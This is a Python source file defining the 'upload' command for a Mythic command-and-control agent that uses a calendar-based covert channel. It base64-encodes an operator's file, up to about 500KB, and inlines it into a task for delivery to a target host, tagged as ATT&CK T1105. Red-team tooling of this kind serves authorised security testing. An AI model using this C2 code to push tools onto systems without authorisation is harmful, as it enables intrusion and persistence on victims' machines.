from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import base64

# Calendar C2 single-shot limit (must match agent download/upload ceiling)
MAX_CALENDAR_UPLOAD = 512000


class UploadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="File to upload to target (max ~500KB)",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
            CommandParameter(
                name="remote_path",
                type=ParameterType.String,
                description="Destination path on target (file path, or directory — default: current directory)",
                parameter_group_info=[ParameterGroupInfo(required=False)],
                default_value=".",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply a file to upload")
        self.load_args_from_json_string(self.command_line)


class UploadCommand(CommandBase):
    cmd = "upload"
    needs_admin = False
    help_cmd = "upload (use popup or file browser)"
    description = (
        "Upload a small file to the target over Calendar C2 "
        "(≤~500KB, single-shot; contents inlined into the task)"
    )
    version = 3
    author = "@0xNirvana"
    argument_class = UploadArguments
    attackmapping = ["T1105"]
    supported_ui_features = ["file_browser:upload"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        file_id = taskData.args.get_arg("file")
        remote_path = taskData.args.get_arg("remote_path") or "."

        # Original filename for DisplayParams / agent default name
        filename = "uploaded_file"
        meta = await SendMythicRPCFileSearch(
            MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID,
                AgentFileID=file_id,
            )
        )
        if meta.Success and getattr(meta, "Files", None):
            if len(meta.Files) > 0 and meta.Files[0].Filename:
                filename = meta.Files[0].Filename

        # Mythic File params are UUIDs — fetch bytes and inline as base64 for Chronos
        file_resp = await SendMythicRPCFileGetContent(
            MythicRPCFileGetContentMessage(AgentFileId=file_id)
        )
        if not file_resp.Success:
            raise Exception(f"Failed to fetch file from Mythic: {file_resp.Error}")

        raw = file_resp.Content
        if isinstance(raw, str):
            raw = raw.encode("utf-8")
        else:
            raw = bytes(raw)

        if len(raw) > MAX_CALENDAR_UPLOAD:
            raise Exception(
                f"File too large for Calendar C2: {len(raw)} bytes "
                f"(max {MAX_CALENDAR_UPLOAD} / ~500KB). Large uploads are not supported."
            )

        taskData.args.add_arg("file", base64.b64encode(raw).decode("ascii"))
        taskData.args.add_arg("filename", filename)
        response.DisplayParams = f"{filename} -> {remote_path}"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
